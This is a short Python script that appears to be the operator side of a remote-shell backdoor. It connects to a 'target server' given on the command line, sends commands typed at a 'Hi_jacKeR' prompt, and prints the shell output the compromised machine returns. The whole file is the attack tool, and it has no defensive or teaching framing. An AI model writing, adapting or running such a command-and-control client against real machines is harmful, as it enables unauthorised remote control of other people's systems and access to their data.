import socket, threading, time
import subprocess
import os
import sys

def worker(soc, com):
      soc.send(com.encode()) #send command

#get message worker
def worker2(s):
      print(s.recv(1024).decode()) #recv shell output
      print("Hi_jacKeD >>>  ", end="") 

    
with socket.socket() as soc:
      soc.connect((sys.argv[1], int(sys.argv[2]))) #connect to target server
      command = ""
      while command!="q":
            command = input("Hi_jacKeR >>>  ") #get command from user
            t=threading.Thread(target=worker, args=(soc,command)) #create new message push thread
            t.start()
            time.sleep(1)# give time for execution
            t2=threading.Thread(target=worker2, args=(soc,)) #create new message read thread
            t2.start()